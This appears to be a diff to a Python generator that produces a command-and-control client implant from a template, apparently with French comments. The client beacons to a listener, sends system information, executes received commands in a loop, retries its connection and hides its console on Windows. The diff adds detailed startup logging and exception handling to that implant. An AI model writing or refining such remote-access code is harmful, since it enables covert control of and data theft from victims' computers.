@@ -49,9 +49,20 @@ class C2Client:
         # Debug logging can be enabled at runtime by setting C2_DEBUG=1
         self.debug_mode = os.getenv('C2_DEBUG') == '1'
         self.debug_file = os.path.join(os.getenv('TEMP', '/tmp'), 'c2_debug.log')
+        self.startup_log = os.path.join(os.getenv('TEMP', '/tmp'), 'c2_startup.log')
+        self._write_startup_log('[C2CLIENT] Initialized with {0}:{1}'.format(ip, port))
+    
+    def _write_startup_log(self, msg):
+        """Always write startup logs"""
+        try:
+            with open(self.startup_log, 'a') as f:
+                f.write("{0} - {1}\\n".format(time.strftime('%H:%M:%S'), msg))
+        except:
+            pass
     
     def debug_log(self, msg):
         """Write debug info to file"""
+        self._write_startup_log(msg)  # Always log
         if self.debug_mode:
             try:
                 with open(self.debug_file, 'a') as f:
@@ -222,25 +233,30 @@ class C2Client:
     
     def run(self):
         """Main loop with retry logic"""
+        self.debug_log("[RUN] Starting C2 client main loop")
         max_retries = 10
         retry_delay = 5
         
         for attempt in range(max_retries):
+            self.debug_log("[RUN] Connection attempt {0}/{1}".format(attempt + 1, max_retries))
             if self.connect():
                 try:
+                    self.debug_log("[RUN] Connected! Sending system info...")
                     # Send initial info
                     self.send_json(self.get_system_info())
+                    self.debug_log("[RUN] Entering command loop...")
                     
                     # Command loop
                     while self.running:
                         cmd_data = self.recv_json()
                         if not cmd_data:
+                            self.debug_log("[RUN] No command received, breaking loop")
                             break
                         
                         response = self.handle_command(cmd_data)
                         self.send_json(response)
-                except:
-                    pass
+                except Exception as e:
+                    self.debug_log("[RUN] Exception in command loop: {0}".format(str(e)))
                 finally:
                     try:
                         self.socket.close()
@@ -249,10 +265,14 @@ class C2Client:
                 
                 # If we get here, connection was lost, retry
                 if self.running:
+                    self.debug_log("[RUN] Connection lost, waiting {0}s before retry...".format(retry_delay))
                     time.sleep(retry_delay)
             else:
                 # Connection failed, wait and retry
+                self.debug_log("[RUN] Connection attempt {0} failed, waiting {1}s...".format(attempt + 1, retry_delay))
                 time.sleep(retry_delay)
+        
+        self.debug_log("[RUN] Max retries exceeded, exiting")
 
 if __name__ == '__main__':
     # Self-test mode for CI (no network, fast exit)
@@ -271,14 +291,43 @@ if __name__ == '__main__':
         # Ignore and continue normal run
         pass
 
+    # Write startup log
+    startup_log = os.path.join(os.getenv('TEMP', '/tmp'), 'c2_startup.log')
+    try:
+        with open(startup_log, 'a') as f:
+            f.write("[MAIN] C2 client starting\\n")
+    except:
+        pass
+
     # Detach from console on Windows
     if sys.platform.startswith('win'):
-        import ctypes
-        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
-        kernel32.FreeConsole()
+        try:
+            import ctypes
+            with open(startup_log, 'a') as f:
+                f.write("[MAIN] Calling FreeConsole()\\n")
+            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
+            kernel32.FreeConsole()
+            with open(startup_log, 'a') as f:
+                f.write("[MAIN] FreeConsole() success\\n")
+        except Exception as e:
+            with open(startup_log, 'a') as f:
+                f.write("[MAIN] FreeConsole() error: {0}\\n".format(str(e)))
 
-    client = C2Client(__LISTENER_IP__, __LISTENER_PORT__)
-    client.run()
+    try:
+        with open(startup_log, 'a') as f:
+            f.write("[MAIN] Creating C2Client({0}, {1})\\n".format('__LISTENER_IP__', '__LISTENER_PORT__'))
+        client = C2Client('__LISTENER_IP__', '__LISTENER_PORT__')
+        with open(startup_log, 'a') as f:
+            f.write("[MAIN] Calling client.run()\\n")
+        client.run()
+        with open(startup_log, 'a') as f:
+            f.write("[MAIN] client.run() completed\\n")
+    except Exception as e:
+        with open(startup_log, 'a') as f:
+            f.write("[MAIN] Exception: {0}\\n".format(str(e)))
+        import traceback
+        with open(startup_log, 'a') as f:
+            f.write("[MAIN] Traceback: {0}\\n".format(traceback.format_exc()))
 '''
         # Remplacer les placeholders par les vraies valeurs
         return code_template.replace("__LISTENER_IP__", repr(self.listener_ip)).replace(
